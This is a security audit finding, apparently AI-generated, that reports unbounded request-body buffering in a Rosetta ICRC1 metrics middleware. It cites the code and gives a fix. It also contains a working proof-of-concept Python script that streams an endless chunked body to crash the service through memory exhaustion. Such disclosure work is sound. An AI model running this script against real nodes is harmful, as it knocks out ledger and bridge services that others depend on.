The code is confirmed. Here is the analysis:

---

### Title
Unbounded Body Buffering via `to_bytes(body, usize::MAX)` in `RosettaMetricsMiddleware` Enables Unauthenticated OOM DoS — (`rs/rosetta-api/common/rosetta_core/src/metrics.rs`)

---

### Summary

The `RosettaMetricsMiddleware` unconditionally buffers the entire HTTP request body with no size cap before any routing or validation occurs. An unauthenticated attacker can exhaust process heap memory by streaming an arbitrarily large body to any ICRC1 Rosetta POST endpoint, OOM-killing the process and halting all ledger sync and asset bridge operations.

---

### Finding Description

In `extract_canister_id`, the body is consumed with:

```rust
let bytes = to_bytes(body, usize::MAX).await?;
``` [1](#0-0) 

This is called unconditionally from `RosettaMetricsMiddleware::call` for every non-`/metrics` request:

```rust
let (canister_id, reconstructed_body) = match extract_canister_id(body).await {
    Ok((canister_id, body_bytes)) => (canister_id, Body::from(body_bytes)),
    Err(_) => (None, Body::empty()),
};
``` [2](#0-1) 

The ICRC1 Rosetta Axum router applies this middleware as the **outermost layer**, with no `RequestBodyLimitLayer` or `DefaultBodyLimit` anywhere in the stack:

```rust
let app = Router::new()
    .route("/block", post(block))
    .route("/account/balance", post(account_balance))
    // ... all other routes ...
    .layer(metrics_layer)   // ← vulnerable middleware, no size guard before this
    .layer(add_request_span())
    .layer(RequestIdLayer)
    .with_state(token_app_states.clone());
``` [3](#0-2) 

Contrast this with the IC HTTP endpoint stack, which explicitly applies a body size limit:

```rust
.layer(RequestBodyLimitLayer::new(config.max_request_size_bytes as usize))
``` [4](#0-3) 

No such guard exists in the Rosetta ICRC1 stack.

---

### Impact Explanation

An attacker who can reach the Rosetta HTTP port (default `0.0.0.0:<port>`) sends a single POST to `/block` or any other endpoint with a streaming body of arbitrary size (no `Content-Length` required). The middleware allocates a contiguous `Bytes` buffer equal to the full body size before any routing, authentication, or JSON parsing occurs. When the allocation exceeds available RSS, the OS OOM-kills the process. The sync thread, withdrawal processor, and all in-flight ckBTC/ckETH operations served by that instance stall until the process is manually restarted.

---

### Likelihood Explanation

The Rosetta port is typically publicly reachable (it is the exchange-facing API). No credentials, valid JSON, or prior state are required — a single TCP connection with a chunked-transfer body suffices. The attack is repeatable: even if the process is restarted, the attacker can immediately re-trigger it.

---

### Recommendation

Replace `usize::MAX` with a reasonable maximum (e.g., 10 MB for Rosetta JSON payloads) in `extract_canister_id`:

```rust
const MAX_BODY_SIZE: usize = 10 * 1024 * 1024; // 10 MB
let bytes = to_bytes(body, MAX_BODY_SIZE).await
    .map_err(|_| /* return 413 */)?;
```

Alternatively, add `RequestBodyLimitLayer::new(MAX_BODY_SIZE)` to the Axum router in `rs/rosetta-api/icrc1/src/main.rs` **before** `metrics_layer` is applied, mirroring the pattern used in `rs/http_endpoints/public/src/lib.rs`.

---

### Proof of Concept

```bash
# Stream a 2 GB body to the /block endpoint; no Content-Length header needed
python3 -c "
import socket, time
s = socket.create_connection(('rosetta-host', 8082))
s.send(b'POST /block HTTP/1.1\r\nHost: rosetta-host\r\nTransfer-Encoding: chunked\r\nContent-Type: application/json\r\n\r\n')
chunk = b'%x\r\n%s\r\n' % (65536, b'A' * 65536)
while True:
    s.send(chunk)
    time.sleep(0.001)
"
# Monitor: watch -n1 'ps aux | grep rosetta'
# Expected: process RSS grows unboundedly → OOM kill → sync thread dies
```

### Citations

**File:** rs/rosetta-api/common/rosetta_core/src/metrics.rs (L336-339)
```rust
            let (canister_id, reconstructed_body) = match extract_canister_id(body).await {
                Ok((canister_id, body_bytes)) => (canister_id, Body::from(body_bytes)),
                Err(_) => (None, Body::empty()),
            };
```

**File:** rs/rosetta-api/common/rosetta_core/src/metrics.rs (L385-389)
```rust
async fn extract_canister_id(
    body: Body,
) -> Result<(Option<String>, Bytes), Box<dyn std::error::Error + Send + Sync>> {
    // Read body bytes
    let bytes = to_bytes(body, usize::MAX).await?;
```

**File:** rs/rosetta-api/icrc1/src/main.rs (L361-391)
```rust
    let app = Router::new()
        .route("/ready", get(ready))
        .route("/health", get(health))
        .route("/call", post(call))
        .route("/network/list", post(network_list))
        .route("/network/options", post(network_options))
        .route("/network/status", post(network_status))
        .route("/block", post(block))
        .route("/account/balance", post(account_balance))
        .route("/block/transaction", post(block_transaction))
        .route("/search/transactions", post(search_transactions))
        .route("/mempool", post(mempool))
        .route("/mempool/transaction", post(mempool_transaction))
        .route("/construction/derive", post(construction_derive))
        .route("/construction/preprocess", post(construction_preprocess))
        .route("/construction/metadata", post(construction_metadata))
        .route("/construction/combine", post(construction_combine))
        .route("/construction/submit", post(construction_submit))
        .route("/construction/hash", post(construction_hash))
        .route("/construction/payloads", post(construction_payloads))
        .route("/construction/parse", post(construction_parse))
        // Apply the metrics middleware
        .layer(metrics_layer)
        // This layer creates a span for each http request and attaches
        // the request_id, HTTP Method and path to it.
        .layer(add_request_span())
        // This layer creates a new id for each request and puts it into the
        // request extensions. Note that it should be added after the
        // Trace layer.
        .layer(RequestIdLayer)
        .with_state(token_app_states.clone());
```

**File:** rs/http_endpoints/public/src/lib.rs (L689-691)
```rust
            .layer(RequestBodyLimitLayer::new(
                config.max_request_size_bytes as usize,
            ))
```
